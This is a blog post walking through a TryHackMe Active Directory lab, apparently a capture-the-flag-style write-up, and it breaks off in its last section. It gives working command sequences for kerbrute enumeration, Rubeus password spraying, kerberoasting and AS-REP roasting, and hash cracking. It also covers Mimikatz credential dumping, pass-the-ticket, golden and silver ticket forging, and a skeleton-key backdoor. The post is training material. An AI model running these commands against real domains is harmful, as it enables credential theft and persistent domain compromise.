<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="THM Attacking Kerberos Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Attacking Kerberos" /><meta property="og:description" content="Attacking Kerberos" /><link rel="canonical" href="https://faecomputing.com/posts/attacking-kerberos/" /><meta property="og:url" content="https://faecomputing.com/posts/attacking-kerberos/" /><meta property="og:site_name" content="Brian Biddle" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-30T12:00:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM Attacking Kerberos Writeup" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-08T15:37:19-07:00","datePublished":"2022-08-30T12:00:00-07:00","description":"Attacking Kerberos","headline":"THM Attacking Kerberos Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://faecomputing.com/posts/attacking-kerberos/"},"url":"https://faecomputing.com/posts/attacking-kerberos/"}</script><title>THM Attacking Kerberos Writeup | Brian Biddle</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Brian Biddle"><meta name="application-name" content="Brian Biddle"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/25892119?s=400&u=145fa93f810fec4ad1198396454af7fb0ac968ee&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Brian Biddle</a></div><div class="site-subtitle font-italic">Homelab and Cyber Security notes</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/xXKaitoNakamuraXx" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/brian-biddle-165b8b211" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brian.biddle.w','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM Attacking Kerberos Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>THM Attacking Kerberos Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1661886000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 30, 2022 </em> </span> <span> Updated <em class="" data-ts="1665268639" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 8, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/username">Brian Biddle</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1407 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h1 id="attacking-kerberos">Attacking Kerberos</h1><hr /><p><img data-src="/assets/images/thm/kerberos/first-image.png" alt="" data-proofer-ignore></p><p>Welcome to my THM Attacking Kerberos writeup. I will only be covering the more technical aspects of the room instead of the reading definition or reading based questions. If you need any help with this you’ve come to the right place! Please follow along!</p><h2 id="task-2"><span class="mr-2">Task 2</span><a href="#task-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>This task starts off with a bit more setup by adding the domain+IP of the machine to your /etc/hosts file for following the commands for the rest of the room. you can add this manually through your text editor or from terminal via: ( $IP is the environment variable I set for every machine as to not have to remember and consistently copy/paste when needed )</p><p>To set the environment variable.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">set </span><span class="nv">IP</span><span class="o">=</span>&lt;thm-machine-ip&gt;
</pre></table></code></div></div><p>Add machine to your /etc/hosts.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="nv">$IP</span> contrller.local <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><p>Now we will need to pull down the Username and Password files provided for the room.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>git clone https://github.com/Cryilllic/Active-Directory-Wordlists
</pre></table></code></div></div><p>Now we get to the main part of this task. Here we will start our user enumeration on kerberos via kerbrute. ( all following commands will be run in the same directory we downloaded the wordlists )</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kerbrute userenum <span class="nt">--dc</span> CONTROLLER.local <span class="nt">-d</span> CONTROLLER.local Active-Directory-Wordlists/User.txt
</pre></table></code></div></div><p>Once ran we should see the following output. <img data-src="/assets/images/thm/kerberos/kerbrute1.png" alt="" data-proofer-ignore> <img data-src="/assets/images/thm/kerberos/kerbrute2.png" alt="" data-proofer-ignore></p><p>From this output you will be able to answer the questions for the task.</p><h2 id="task-3"><span class="mr-2">Task 3</span><a href="#task-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>For this task we will need to have remote access to the machine. This can be achieved via SSH or RDP. For this guide I will be using remmina to RDP into the machine.</p><p>Open remmina and click the new connection icon. <img data-src="/assets/images/thm/kerberos/remmina1.png" alt="" data-proofer-ignore></p><p>Next change the protocol to RDP and add all required credentials and connect. <img data-src="/assets/images/thm/kerberos/remmina2.png" alt="" data-proofer-ignore> once connected open a command prompt, navigate to the Downloads directory, and run this command: ( This command runs rubeus and calls the harvest command. this collects the tickets being sent to the KDC or Key distribution center, and checks every 30 seconds)</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Rubeus.exe harvest /interval:30
</pre></table></code></div></div><p>You should see the output bellow. <img data-src="/assets/images/thm/kerberos/rubeus1.png" alt="" data-proofer-ignore> <img data-src="/assets/images/thm/kerberos/rubeus2.png" alt="" data-proofer-ignore></p><p>With this output you will be able to answer the task questions however please continue with the task instructions to learn password spraying via rubeus.</p><p>Before attempting the password spraying we will need to add the machine to the windows hosts file.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="nv">$IP</span> CONTROLLER.local <span class="o">&gt;&gt;</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
</pre></table></code></div></div><p>Once added we can begin the attack. The following command calls the brute function to start a brute force attack, and passes the password variable along with the noticket option to spray the given password to all available tickets to see if their is a match.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Rubeus.exe brute /password:Password1 /noticket
</pre></table></code></div></div><p>You should see the output bellow. <img data-src="/assets/images/thm/kerberos/rubeus3.png" alt="" data-proofer-ignore></p><p>Here you see that the user <strong>Machine1</strong> has a password of <strong>Password1</strong></p><h2 id="task-4"><span class="mr-2">Task 4</span><a href="#task-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>As stated in the task “Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account”</p><p>Lets start the roast!</p><p>Again we start with rubeus and of course to start the roast we call kerberoast.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Rubeus.exe kerberoast
</pre></table></code></div></div><p>Once done you should see the following output. <img data-src="/assets/images/thm/kerberos/kerberoast1.png" alt="" data-proofer-ignore> <img data-src="/assets/images/thm/kerberos/kerberoast2.png" alt="" data-proofer-ignore></p><p>now copy and paste the hashes provided onto your attack machine and crack the hash. for this room we use hashcat however john the ripper works just as well. do this for both hashes.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 13100 <span class="nt">-a</span> 0 hash.txt Active-Directory-Wordlists/Pass.txt<span class="sb">`</span>
</pre></table></code></div></div><p>Once cracked you should have the passwords here: <strong>MYPassword123#</strong> <strong>Summer2020</strong></p><p><strong>If you get no output try the following command to check cracked hashes ( change the hash.txt to each hash file you have to show )</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">--show</span> hash.txt
</pre></table></code></div></div><p>To do the same thing but remotely without needing rubeus installed on the target we can use this impacket python script to achieve the answers</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GetUserSPNs.py controller.local/Machine1:Password1 <span class="nt">-dc-ip</span> 10.10.205.63 <span class="nt">-request</span>
</pre></table></code></div></div><h2 id="task-5"><span class="mr-2">Task 5</span><a href="#task-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>For this task we will be attacking in another popular method as-rep roasting. As discussed in the task “ AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.” to exploit this we must do the following:</p><p>Execute this on the target machine. same as kerberoasting.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Rubeus.exe asreproast
</pre></table></code></div></div><p>You should get this output <img data-src="/assets/images/thm/kerberos/asreproast.png" alt="" data-proofer-ignore></p><p>In the task it says to insert a 23 after the kerb5asrep in the hash however you can still retrieve the password without this step. Now same as the last task crack those hashes!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 18200 hash.txt Active-Directory-Wordlists/Pass.txt
</pre></table></code></div></div><p>you can also use john</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>john <span class="nt">--format</span><span class="o">=</span>krb5asrep <span class="nt">--wordlist</span><span class="o">=</span>Active-Directory-Wordlists/Pass.txt hash.txt
</pre></table></code></div></div><p><strong>Again if you error out you can run the –show option for both cracking tools to see the password</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>john <span class="nt">--show</span> hash.txt
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">--show</span> hash.txt
</pre></table></code></div></div><h2 id="task-6"><span class="mr-2">Task 6</span><a href="#task-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>Now we will start exploring the use of Mimikatz. first things first ensure you have proper permissions to run mimikatz</p><p>do so by entering</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>privilege::debug
</pre></table></code></div></div><p>you should see the following output.</p><p><img data-src="/assets/images/thm/kerberos/mimikatz-priv.png" alt="" data-proofer-ignore></p><p>one thing we can do is grab all available client tickets on the machine.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sekurlsa::tickets /export
</pre></table></code></div></div><p>You will see a lot of output like the following. This command just grabbed all the available tickets and placed them within your working directory. In this case, Downloads.</p><p><img data-src="/assets/images/thm/kerberos/mimikatz-tickets1.png" alt="" data-proofer-ignore></p><p>You can see this in file explorer here</p><p><img data-src="/assets/images/thm/kerberos/mimikatz-tickets2.png" alt="" data-proofer-ignore></p><p>now to “login” as one of these users using the following command.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kerberos::ptt <span class="o">[</span>0<span class="p">;</span>77e19]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL
</pre></table></code></div></div><p>You should receive this output.</p><p><img data-src="/assets/images/thm/kerberos/mimikatz-tickets3.png" alt="" data-proofer-ignore></p><p>To see if we are now accessing the other account you will want to exit mimikatz and run</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>klist
</pre></table></code></div></div><p>Here you will see the client is now showing as Admin</p><p><img data-src="/assets/images/thm/kerberos/mimikatz-tickets4.png" alt="" data-proofer-ignore></p><p>You have successfully passed the hash!!</p><h2 id="task-7"><span class="mr-2">Task 7</span><a href="#task-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>Here we will be discussing how to make a silver ticket. As stated in the task, “KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want.”</p><p>To start this off we will need to start off the same way as we did in the other mimikatz tasks.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mimikatz.exe 
</pre></table></code></div></div><p>and</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>privilege::debug
</pre></table></code></div></div><p>Then we will run</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lsadump::lsa /inject /name:krbtgt
</pre></table></code></div></div><p>As stated in the task, “This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.”</p><p>Example output below</p><p><img data-src="/assets/images/thm/kerberos/mimikatz1.png" alt="" data-proofer-ignore> <img data-src="/assets/images/thm/kerberos/mimikatz2.png" alt="" data-proofer-ignore></p><p>As the task said “This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.”</p><p>golden</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:&lt;NTLM HASH&gt; /id:500
</pre></table></code></div></div><p>silver</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:&lt;NTLM HASH&gt; /id:1103
</pre></table></code></div></div><p><img data-src="/assets/images/thm/kerberos/mimikatz3.png" alt="" data-proofer-ignore></p><p>This will spawn a new command prompt with the privileges of the new ticket</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>misc::cmd
</pre></table></code></div></div><p>Do the first step we did to dump the NTLM hash but change the name to Administrator</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lsadump::lsa /inject /name:Administrator
</pre></table></code></div></div><p>The output will provide your answer for the task.</p><p><img data-src="/assets/images/thm/kerberos/mimikatz-admin.png" alt="" data-proofer-ignore></p><p>Same here but name = sqlservice</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lsadump::lsa /inject /name:sqlservice
</pre></table></code></div></div><p>The output will provide your answer for the task.</p><p><img data-src="/assets/images/thm/kerberos/mimikatz-sql.png" alt="" data-proofer-ignore></p><h2 id="task-8"><span class="mr-2">Task 8</span><a href="#task-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>Here we will be using a kerberos backdoor from mimikatz called a skeleton key. As discussed in the task “ A Kerberos backdoor acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.” once mimikatz is installed on the target it is rather simple to use.</p><p>simply follow these commands</p><p>To start Mimikatz</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mimikatz.exe
</pre></table></code></div></div><p>To check if your privilege is ok</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>privilege::debug
</pre></table></code></div></div><p><img data-src="/assets/images/thm/kerberos/mimikatz-priv.png" alt="" data-proofer-ignore></p><p>To get your skeleton key</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>misc::skeleton
</pre></table></code></div></div><p><img data-src="/assets/images/thm/kerberos/mimikatz-skel.png" alt="" data-proofer-ignore></p><p>now you will be able to access nearly anything you need or require. As stated in the task ‘The default hash for a mimikatz skeleton key is <em>60BA4FCADC466C7A033C178194C03DF6</em> which makes the password -“<em>mimikatz</em>” ‘</p><p>for example to access the admin share you could use this command.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>net use c:<span class="se">\\</span>DOMAIN-CONTROLLER<span class="se">\a</span>dmin<span class="nv">$ </span>/user:Administrator mimikatz
